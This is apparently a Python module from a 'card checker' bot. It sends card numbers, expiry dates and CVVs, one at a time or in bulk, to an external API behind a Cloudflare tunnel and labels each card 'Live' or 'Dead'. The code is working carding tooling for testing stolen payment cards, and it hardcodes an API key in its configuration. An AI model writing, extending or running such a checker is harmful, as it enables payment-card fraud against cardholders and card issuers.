import aiohttp
import asyncio
from typing import Callable

# ========== CONFIGURACIÓN ==========
ATLANTIC_API_URL = "https://viewing-nikon-tournament-agreement.trycloudflare.com"  # Puerto 8001 (tu otra API está en 8000)
ATLANTIC_API_KEY = "atlantic_Ga50r9CO-n8Z5_SSATE8MYeC0n6o_kv_HkrOGfMse6c"  # ← REEMPLAZA con tu key real

# Headers por defecto para todas las peticiones
DEFAULT_HEADERS = {
    "X-API-Key": ATLANTIC_API_KEY,
    "Content-Type": "application/json",
    "Accept": "application/json"
}

async def atlantic_check(card_info: str, user_id: int):
    """
    Verifica una tarjeta individual usando la API Atlantic
    """
    try:
        parts = card_info.split("|")
        if len(parts) != 4:
            return {"status": "❌ Error", "message": "Formato inválido. Usa: cc|mes|año|cvv"}
        
        cc, mes, ano, cvv = parts
        
        async with aiohttp.ClientSession() as session:
            payload = {
                "card_number": cc,
                "exp_month": mes,
                "exp_year": ano,
                "cvc": cvv
            }
            
            async with session.post(
                f"{ATLANTIC_API_URL}/check", 
                json=payload,
                headers=DEFAULT_HEADERS
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    
                    # Mapear el resultado de la API al formato que espera el bot
                    if data["status"] == "APPROVED":
                        return {
                            "status": "✅ Live",
                            "message": data.get("message", "Your card's security code is incorrect.")
                        }
                    elif data["status"] == "DECLINED":
                        return {
                            "status": "❌ Dead", 
                            "message": data.get("message", "Card was declined")
                        }
                    else:
                        return {
                            "status": "❌ Error",
                            "message": data.get("message", "Unknown error")
                        }
                
                elif response.status == 403:
                    return {
                        "status": "❌ Error",
                        "message": "API Key inválida o expirada"
                    }
                
                elif response.status == 422:
                    error_detail = await response.text()
                    return {
                        "status": "❌ Error",
                        "message": f"Datos inválidos: {error_detail}"
                    }
                
                else:
                    error_text = await response.text()
                    return {
                        "status": "❌ Error",
                        "message": f"API Error {response.status}: {error_text}"
                    }
                    
    except aiohttp.ClientConnectorError:
        return {
            "status": "❌ Error",
            "message": "No se pudo conectar a la API TOPSECRETATLANTIDA. ¿Está corriendo en el puerto 8001?"
        }
    except Exception as e:
        return {
            "status": "❌ Error",
            "message": f"Exception: {str(e)}"
        }

async def atlantic_check_multiple(cards: list, user_id: int, callback: Callable):
    """
    Verifica múltiples tarjetas usando la API Atlantic
    """
    try:
        # Preparar payload para mass check
        cards_payload = []
        for card_info in cards:
            parts = card_info.split("|")
            if len(parts) == 4:
                cards_payload.append({
                    "card_number": parts[0],
                    "exp_month": parts[1],
                    "exp_year": parts[2],
                    "cvc": parts[3]
                })
        
        if not cards_payload:
            await callback(0, {
                "status": "❌ Error",
                "message": "No hay tarjetas válidas para verificar"
            }, "", user_id)
            return
        
        async with aiohttp.ClientSession() as session:
            payload = {"cards": cards_payload}
            
            async with session.post(
                f"{ATLANTIC_API_URL}/check/mass", 
                json=payload,
                headers=DEFAULT_HEADERS
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    results = data.get("results", [])
                    
                    # Llamar al callback para cada resultado
                    for i, result in enumerate(results):
                        if i < len(cards):
                            # Mapear resultado
                            if result["status"] == "APPROVED":
                                mapped_result = {
                                    "status": "✅ Live",
                                    "message": result.get("message", "Approved")
                                }
                            elif result["status"] == "DECLINED":
                                mapped_result = {
                                    "status": "❌ Dead",
                                    "message": result.get("message", "Declined")
                                }
                            else:
                                mapped_result = {
                                    "status": "❌ Error",
                                    "message": result.get("message", "Error")
                                }
                            
                            await callback(i, mapped_result, cards[i], user_id)
                            await asyncio.sleep(0.5)  # Pequeña pausa entre callbacks
                
                elif response.status == 403:
                    for i, card in enumerate(cards):
                        await callback(i, {
                            "status": "❌ Error",
                            "message": "API Key inválida o expirada"
                        }, card, user_id)
                
                else:
                    error_text = await response.text()
                    for i, card in enumerate(cards):
                        await callback(i, {
                            "status": "❌ Error",
                            "message": f"API Error {response.status}: {error_text}"
                        }, card, user_id)
                        
    except aiohttp.ClientConnectorError:
        for i, card in enumerate(cards):
            await callback(i, {
                "status": "❌ Error",
                "message": "No se pudo conectar a la API TOPSECRETATLANTIDA. ¿Está corriendo en el puerto 8001?"
            }, card, user_id)
    except Exception as e:
        # Error general - notificar para todas las tarjetas
        for i, card in enumerate(cards):
            await callback(i, {
                "status": "❌ Error",
                "message": f"Exception: {str(e)}"
            }, card, user_id)

# ========== FUNCIÓN AUXILIAR PARA TEST ==========
async def test_connection():
    """Testea la conexión a la API"""
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                f"{ATLANTIC_API_URL}/health",
                headers=DEFAULT_HEADERS
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    print(f"✅ API Atlantic conectada: {data}")
                    return True
                else:
                    print(f"❌ Error {response.status}: {await response.text()}")
                    return False
    except Exception as e:
        print(f"❌ Error de conexión: {e}")
        return False

# Si ejecutas este archivo directamente, testea la conexión
if __name__ == "__main__":
    print("🔌 Testeando conexión a Atlantic API...")
    print(f"URL: {ATLANTIC_API_URL}")
    print(f"API Key: {ATLANTIC_API_KEY[:20]}...")
    asyncio.run(test_connection())
